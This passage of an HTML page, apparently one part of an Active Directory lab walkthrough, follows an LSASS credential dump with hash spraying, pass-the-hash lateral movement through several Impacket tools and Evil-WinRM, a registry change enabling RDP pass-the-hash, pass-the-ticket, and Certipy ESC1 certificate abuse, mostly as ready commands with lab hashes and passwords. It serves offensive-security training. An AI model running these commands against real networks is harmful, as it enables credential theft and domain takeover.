+    NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$ [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-01-17 07:07 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_dac9281e_20240117070742.kirbi)
+    NORTH.SEVENKINGDOMS.LOCAL\jeor.mormont [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-01-17 07:25 (TGT_NORTH.SEVENKINGDOMS.LOCAL_jeor.mormont_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_0a30c9d9_20240117072534.kirbi)
+    NORTH.SEVENKINGDOMS.LOCAL\jeor.mormont [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-01-17 07:25 (TGT_NORTH.SEVENKINGDOMS.LOCAL_jeor.mormont_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_9c9352bc_20240117072534.kirbi)
+    NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$ [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-01-17 07:07 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_6b0a745e_20240117070741.kirbi)
+    NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$ [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-01-17 07:07 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_a9d5f3b9_20240117070741.kirbi)
+    27 Kerberos tickets written to /home/stark/.config/lsassy/tickets
+    18 masterkeys saved to /home/stark/.config/lsassy/masterkeys.txt
+</p>
+    </code></pre>
+
+    <img src="images/image-333.png" alt="Untitled">
+
+<p>
+    It’s possible to see that we were able to retrieved  several NT hashes, Ticket Granting Tickets as well.
+</p>
+
+<p>
+    Now as I stated before, This attack only works if there is any session(logged-in user) on the machine, because all user authentication, password changes, creation of access tokens, and enforcement of security policies are stored in the RAM. Now let’s do some exercise here.
+    Let’s login with another user and see if we will be able to retrieve the just logged-in user as well.
+</p>
+
+<p>
+    We will use xfreerdp to login as <code>catelyn.stark</code>.
+</p>
+
+    <code>xfreerdp /d:north.sevenkingdoms.local /u:catelyn.stark /p:robbsansabradonaryarickon /v:castelblack.north.sevenkingdoms.local /cert-ignore</code>
+
+<p>
+    Once we run lsassy with dumpertdll module again, we can see that we were able to get a new user named catelyn.stark and its hash.
+</p>
+
+    <img src="images/image-334.png" alt="Untitled">
+
+<p>
+    User: catelyn.stark
+</p>
+
+<p>
+    Hash: [NT] cba36eccfd9d949c73bc73715364aff5 | [SHA1] be37d26374175f082b2c536d3114bafb2ad0e4fc
+</p>
+
+<p>
+    We can try to crack this NTLM offline or use the hash.
+</p>
+
+<p>
+    ### Password Spraying with NetExec
+</p>
+
+<p>
+    Let’s say that we were not able to crack user <strong>*catelyn.stark</strong>* hash, we can do a Pass the Hash. that’s what we will focus here.
+</p>
+
+<p>
+    Using NetExec, we ca do a password spraying using a hash.
+</p>
+
+    <code>netexec smb 10.4.10.10-23 -u catelyn.stark -H 'cba36eccfd9d949c73bc73715364aff5'</code>
+
+    <code>smb</code> = The option chosen for this attack.
+
+    <code>-u</code> = <strong>USERNAME [USERNAME ...]</strong> = username(s) or file(s) containing usernames
+
+    <code>-H</code> = <strong>HASH [HASH ...], --hash HASH [HASH ...]</strong> = NTLM hash(es) or file(s) containing NTLM hashes
+
+    <img src="images/image-335.png" alt="Untitled">
+
+<p>
+    We can see from the screenshot above that the password spraying on the entire network revealed us something.
+</p>
+
+<p>
+    The user was able to login to machine 10.4.10.11 and marked as <strong>*(Pwn3d!)</strong>*. It means that user <strong>Catelyn.stark</strong> is a high level user in the machine 10.4.10.11.
+</p>
+
+<p>
+    By default NetExec only checks if SMB admin$ is writable. If it is the case NetExec show <strong>*(Pwn3d!)</strong>*.
+    For execution NetExec use the -x option and by default use the wmiexec impacket method
+</p>
+
+<p>
+    # Lateral movement
+</p>
+
+<p>
+    Now lets try lateral movement using Impacket.
+</p>
+
+<p>
+    ### PsExec
+</p>
+
+<ul>
+<li>PsExec:</li>
+<li>upload executable</li>
+<li>create a service to run the executable</li>
+<li>Communicate with the service with namedPipe.</li>
+<li>Protocol : SMB</li>
+</ul>
+
+    <code>psexec.py -hashes 'cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@10.4.10.11</code>
+
+<p>
+    > PsExec easily triggers  defender and can no longer be used with the <strong><code>RemCom</code></strong> service binary embedded with impacket without raising an alert and fail.
+    > 
+</p>
+
+<p>
+    ### WmiExec
+</p>
+
+<p>
+    WmiExec (pseudo-shell):
+</p>
+
+<ul>
+<li>Create new process throught wmi</li>
+<li>Create file to get the command result, read the file with smb and delete it</li>
+<li>Protocols : DCERPC + SMB</li>
+</ul>
+
+    <code>wmiexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@10.4.10.11</code>
+
+    <img src="images/image-336.png" alt="Untitled">
+
+<p>
+    ### SmbExec
+</p>
+
+<p>
+    SmbExec (pseudo-shell):
+</p>
+
+<ul>
+<li>Don’t upload executable</li>
+<li>Create a service on every request</li>
+<li>Get the command results on a share or on a server controled by the attacker (with -mode SERVER)</li>
+<li>Protocol SMB</li>
+</ul>
+
+    <a href="http://smbexec.py/"><code>smbexec.py</a> -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@10.4.10.11</code>
+
+    <img src="images/image-337.png" alt="Untitled">
+
+<p>
+    ### AtExec
+</p>
+
+<p>
+    AtExec (execute command):
+</p>
+
+<ul>
+<li>use a schedule task to run the command</li>
+<li>protocol SMB</li>
+</ul>
+
+    <a href="http://atexec.py/"><code>atexec.py</a> -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@10.4.10.11 whoami</code>
+
+    <img src="images/image-338.png" alt="Untitled">
+
+<p>
+    ### DcomExec
+</p>
+
+<p>
+    DecomExec (Distributed Component Object Model):
+</p>
+
+<ul>
+<li>pseudo shell (get the result in files retreived with smb)</li>
+<li>protocol DCERPC + SMB</li>
+</ul>
+
+    <code>dcomexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@10.4.10.11</code>
+
+<p>
+    ### <strong>Lateral Move with NetExec</strong>
+</p>
+
+<ul>
+<li>By default NetExec only check if smb admin$ is writable. If it is the case NetExec show <strong>*(Pwn3d!)</strong>*.</li>
+<li>For execution Netexec use the -x option and by default use the wmiexec impacket method</li>
+</ul>
+
+    <code>evil-winrm -i 10.4.10.11 -u catelyn.stark -H 'cba36eccfd9d949c73bc73715364aff5’</code>
+
+    <img src="images/image-339.png" alt="Untitled">
+
+    <img src="images/image-340.png" alt="Untitled">
+
+<p>
+    ### Using winrm
+</p>
+
+<ul>
+<li>Winrm</li>
+<li>protocol HTTP or HTTPS</li>
+</ul>
+
+        <img src="images/image-342.png" alt="Untitled">
+
+<p>
+        ### Using RDP
+</p>
+
+<ul>
+<li>If you try to do PTH with RDP :</li>
+</ul>
+
+        <code>xfreerdp /u:catelyn.stark /d:north.sevenkingdoms.local /pth:cba36eccfd9d949c73bc73715364aff5 /v:10.4.10.11</code>
+
+        <img src="images/image-343.png" alt="Untitled">
+
+<p>
+        If we get the error message above, it is because we are using the hash of the user instead of password. To allow RDP connection without password we must Enable restricted admin.
+</p>
+
+
+<p>
+    We can use Evil-WinRM to get the remote access via Powershell and enabled RDP since we are an Admin in the machine10.4.10.11.
+</p>
+
+    <code>New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0</code>
+
+    <img src="images/image-344.png" alt="Untitled">
+
+<p>
+    Or we can also do it remotely using reg.py.
+</p>
+
+<p>
+    First we make a request:
+</p>
+    <a href="http://reg.py/"><code>reg.py</a> NORTH/catelyn.stark@10.4.10.11 -hashes ':cba36eccfd9d949c73bc73715364aff5' query -keyName 'HKLM\System\CurrentControlSet\Control\Lsa'</code>
+
+    <img src="images/image-345.png" alt="Untitled">
+
+<p>
+    If its not created, then we will get the output as the one above, we will have no <strong><code>DisabeleRestritedAdmin</code></strong> created.
+    we can created it and enable it will the following command.
+</p>
+
+    <code>r<a href="http://reg.py/">eg.py</a> NORTH/catelyn.stark@10.4.10.11 -hashes ':cba36eccfd9d949c73bc73715364aff5' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'</code>
+
+<p>
+    Now if we check if and we get the following output below.
+</p>
+
+    <img src="images/image-346.png" alt="Untitled">
+
+<p>
+    It means that this value does exist but its disabled. we can enable it with the following command:
+</p>
+
+    <code>r<a href="http://reg.py/">eg.py</a> NORTH/catelyn.stark@10.4.10.11 -hashes ':cba36eccfd9d949c73bc73715364aff5' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'</code>
+
+    <img src="images/image-347.png" alt="Untitled">
+
+<p>
+    Then we request it again just to make sure that we were able to enable it.
+</p>
+
+    <a href="http://reg.py/"><code>reg.py</a> NORTH/catelyn.stark@10.4.10.11 -hashes ':cba36eccfd9d949c73bc73715364aff5' query -keyName 'HKLM\System\CurrentControlSet\Control\Lsa'</code>
+
+    <img src="images/image-348.png" alt="Untitled">
+
+<p>
+    We were able to change the <strong><code>DisableRestrictedAdmin</code></strong> value to <code>0</code>, we can login via RDP now.
+</p>
+
+<p>
+    Now we can try our RDP connection again and it will work.
+</p>
+
+    <code>xfreerdp /u:catelyn.stark /d:north.sevenkingdoms.local /pth:cba36eccfd9d949c73bc73715364aff5 /v:10.4.10.11</code>
+
+    <img src="images/image-349.png" alt="Untitled">
+
+<p>
+    Once we finish it we can delete it again.
+</p>
+    <code>reg.py NORTH/catelyn.stark@10.4.10.11 -hashes ':cba36eccfd9d949c73bc73715364aff5' delete -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin'</code>
+
+    <img src="images/image-350.png" alt="Untitled">
+
+<p>
+    # Ticket Granting Ticket
+</p>
+
+<p>
+    Continuing with user Catelyn.stark! We can also use Catelyn.stark NT Hash to request a Kerberos Ticket by requesting the TGT
+</p>
+
+    <a href="http://gettgt.py/"><code>getTGT.py</a> -hashes ':cba36eccfd9d949c73bc73715364aff5' north.sevenkingdoms.local/catelyn.stark</code>
+
+    <img src="images/image-351.png" alt="Untitled">
+
+<p>
+    We are able to retrieve Catelyn.stark ticket, its saved as catelyn.stark.ccache, let’s now use Pass The Ticket by exporting the .ccache to a variable called <code>KRB5CCNAME</code>.
+</p>
+
+    <code>export KRB5CCNAME=/workspace/tgt/catelyn.stark.ccache</code> 
+
+<p>
+    We can now the remote access with <a href="http://wmiexec.py">wmiexec.py</a> or evil-winrm but this time using user’s ticket instead of the NT Hash.
+</p>
+
+    <code>wmiexec.py -k -no-pass north.sevenkingdoms.local/catelyn.stark@winterfell</code>
+
+    <img src="images/image-353.png" alt="Untitled">
+
+<p>
+    We can also use Evil-WinRM with the ticket, with the following steps.
+</p>
+
+<p>
+    1 - We export the ticket: <code>export KRB5CCNAME=/workspace/tgt/catelyn.stark.ccache</code>
+</p>
+
+<p>
+    2 - We Add realm to <code>/etc/krb5.conf</code>
+</p>
+
+    <pre><code class="language-bash">    [libdefaults]
+<p>
+            default_realm = NORTH.SEVENKINGDOMS.LOCAL
+</p>
+
+<p>
+    [realms]
+            NORTH.SEVENKINGDOMS.LOCAL = {
+                    kdc = winterfell.north.sevenkingdoms.local
+                    default_domain = north.sevenkingdoms.local
+            }
+</p>
+
+<p>
+    [domain_realm]
+            .north.sevenkingdoms.local = NORTH.SEVENKINGDOMS.LOCAL
+            north.sevenkingdoms.local = NORTH.SEVENKINGDOMS.LOCAL
+</p>
+    </code></pre>
+
+<p>
+    3 - we login to the machine using the machine name.
+</p>
+
+    <code>evil-winrm -i winterfell -r NORTH.SEVENKINGDOMS.LOCAL</code>
+
+    <img src="images/image-354.png" alt="Untitled">
+
+<p>
+    ## Kirbi converter
+</p>
+
+<p>
+    Another thing we can do, is to convert our kirbi file we got previously and convert them to .ccache files using impacket with <a href="https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py">ticketConverter.py</a>.
+</p>
+
+    <code>lsassy -d north.sevenkingdoms.local -u 'jeor.mormont' -p '*L0ngCl@w*' 10.4.10.22 -m dumpertdll -O dumpertdll_path=Outflank-Dumpert-DLL.dll</code>
+
+    <img src="images/image-333.png" alt="Untitled">
+
+<p>
+    # <strong>Certificate</strong>
+</p>
+
+<p>
+    In case we care exploiting a ESC1 vulnerability, we are able to request the certificate of a user and get the Hash then use it to request the TGT.
+</p>
+
+<p>
+    By using Certipy we are able to accomplish that. here we are using the ESC1 vulnerability that we do have to request the administrator certificate.
+</p>
+
+    <code>certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local</code>
+
+    <img src="images/image-355.png" alt="Untitled">
+
+<p>
+    We were able to get the Administrator certificate and we have it as administrator.pfx, now let’s use this certificate to request the administrator Ticket Granting Ticket.
+</p>
+
+<p>
+- 
+</p>
+<div class="part-navigation">
+      <a href="part-7-privilege-escalation.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: PrivEsc</a>
+      <a href="part-9-delegations.html">Next: Delegations <ion-icon name="arrow-forward-outline"></ion-icon></a>
+    </div>
+        </section>
+      </article>
+    </div>
+  </main>
+  <script src="../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
